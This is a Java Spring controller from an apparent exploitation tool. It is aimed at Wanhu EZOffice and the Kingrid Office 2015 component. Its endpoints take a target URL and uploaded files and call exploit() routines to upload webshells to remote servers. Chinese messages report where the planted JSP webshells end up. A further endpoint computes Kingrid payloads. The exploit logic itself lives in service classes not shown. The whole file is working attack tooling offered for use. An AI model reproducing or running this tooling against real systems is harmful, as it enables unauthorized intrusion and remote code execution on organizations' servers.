package com.droplab.Controller.EZOffice;

import com.droplab.Controller.EZOffice.Service.*;
import com.droplab.Utils.CommonUtils;
import org.jsoup.Connection;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.multipart.MultipartFile;

import java.io.File;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Controller
@RequestMapping("/ezoffice")
public class EZOfficeController {

    @RequestMapping(value = "/index", method = RequestMethod.GET)
    public String index(Model model) {
        CommonUtils.modelSet(new HashMap<>(), model);
        return "EZOffice/index.html";
    }

    @RequestMapping(value = "/officeserverservlet", method = RequestMethod.POST)
    public String OfficeServerServlet(Model model,
                                      @RequestParam(value = "files", required = true) List<MultipartFile> files,
                                      @RequestParam(value = "mOption", required = true) String mOption,
                                      @RequestParam(value = "url", required = true) String url,
                                      @RequestParam(value = "count", required = true) String count) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/defaultroot")) {
                url = url + "/defaultroot";
            }
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.Random();
            hashMap.put("url", url);
            hashMap.put("mOption", mOption);
            hashMap.put("count", count);
            hashMap.put("filename", filename);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                EZOfficeOfficeServerServlet o = (EZOfficeOfficeServerServlet) Class.forName(getMap().get("officeserverservlet")).newInstance();
                o.setParams(hashMap);
                Connection.Response response = o.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("officeserverservleturl", url);
                    modelMap.put("officeserverservlet", new String(response.bodyAsBytes()));
                    modelMap.put("officeserverservlettips", String.format("如果写入成功，webshell路径：/platform/portal/%s.jsp", filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "EZOffice/index.html";
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("officeserverservleturl", url);
        modelMap.put("officeserverservlet", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "EZOffice/index.html";
    }


    /**
     * 金格office2015利用
     *
     * @param model
     * @param files
     * @param mOption
     * @param url
     * @return
     */
    @RequestMapping(value = "/OfficeServer", method = RequestMethod.POST)
    public String OfficeServerServlet(Model model,
                                      @RequestParam(value = "files", required = true) List<MultipartFile> files,
                                      @RequestParam(value = "mOption", required = true) String mOption,
                                      @RequestParam(value = "url", required = true) String url) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/defaultroot")) {
                url = url + "/defaultroot";
            }
            HashMap hashMap = new HashMap();
            String filename = CommonUtils.Random();
            hashMap.put("url", url);
            hashMap.put("mOption", mOption);
            hashMap.put("filename", filename);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".tmp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                EZOfficeOfficeServer2015 o = (EZOfficeOfficeServer2015) Class.forName(getMap().get("OfficeServer")).newInstance();
                o.setParams(hashMap);
                Connection.Response response = o.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("OfficeServerurl", url);
                    modelMap.put("OfficeServer", new String(response.bodyAsBytes()));
                    modelMap.put("OfficeServertips", String.format("如果写入成功，webshell路径：/platform/portal/%s.jsp(SAVEPDF)或者" +
                            "/platform/portal/portal%s.jsp(SAVEFILE)", filename,filename));
                    CommonUtils.modelSet(modelMap, model);
                    return "EZOffice/index.html";
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("OfficeServerurl", url);
        modelMap.put("OfficeServer", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "EZOffice/index.html";
    }



    @RequestMapping(value = "/fileUploadController",method = RequestMethod.POST)
    public String FileUploadController(Model model,
                                       @RequestParam(value = "files",required = true) List<MultipartFile> files,
                                       @RequestParam(value = "url", required = true) String url,
                                       @RequestParam(value = "modelName", required = true) String modelName){
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            if (!url.contains("/defaultroot")) {
                url = url + "/defaultroot";
            }
            HashMap hashMap = new HashMap();
            hashMap.put("url", url);
            hashMap.put("modelName",modelName);
            if (!files.isEmpty()) {
                for (MultipartFile file : files) {
                    String rootPath = System.getProperty("java.io.tmpdir") + "//" + CommonUtils.Random() + ".jsp";
                    try {
                        File file1 = new File(rootPath);
                        file.transferTo(file1);
                        if (file1.exists()) {
                            hashMap.put("filepath", rootPath);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                EZOfficeFileUploadController o = (EZOfficeFileUploadController) Class.forName(getMap().get("fileUploadController")).newInstance();
                o.setParams(hashMap);
                Connection.Response response = o.exploit();
                if (response != null) {
                    HashMap<String, String> modelMap = new HashMap<>();
                    modelMap.put("fileUploadControllerurl", url);
                    modelMap.put("fileUploadController", new String(response.bodyAsBytes()));
                    modelMap.put("fileUploadControllertips", String.format("如果写入成功，webshell路径举例：/public/edit/202206/efagrtdad5324rdsfzfde23q41234.jsp"));
                    CommonUtils.modelSet(modelMap, model);
                    return "EZOffice/index.html";
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("fileUploadControllerurl", url);
        modelMap.put("fileUploadController", "请求出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "EZOffice/index.html";
    }

    @RequestMapping(value = "/KingGEPayloadCalc",method = RequestMethod.POST)
    public String FileUploadController(Model model,
                                       @RequestParam(value = "body", required = true) String body,
                                       @RequestParam(value = "file", required = true) String file){
        try {
            KingGEPayloadCalc kingGEPayloadCalc =(KingGEPayloadCalc) Class.forName(getMap().get("KingGEPayloadCalc")).newInstance();
            String payload = kingGEPayloadCalc.getPayload(body, file);
            HashMap<String, String> modelMap = new HashMap<>();
            modelMap.put("KingGEPayloadCalc", payload);
            CommonUtils.modelSet(modelMap, model);
            return "EZOffice/index.html";
        } catch (Exception e) {
            e.printStackTrace();
        }
        HashMap<String, String> modelMap = new HashMap<>();
        modelMap.put("KingGEPayloadCalc", "计算出错，或参数传递不正确");
        CommonUtils.modelSet(modelMap, model);
        return "EZOffice/index.html";
    }

    private Map<String, String> getMap() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("officeserverservlet", "com.droplab.Controller.EZOffice.Service.EZOfficeOfficeServerServlet");
        hashMap.put("OfficeServer", "com.droplab.Controller.EZOffice.Service.EZOfficeOfficeServer2015");
        hashMap.put("fileUploadController", "com.droplab.Controller.EZOffice.Service.EZOfficeFileUploadController");
        hashMap.put("KingGEPayloadCalc","com.droplab.Controller.EZOffice.Service.KingGEPayloadCalc");
        return hashMap;
    }


}
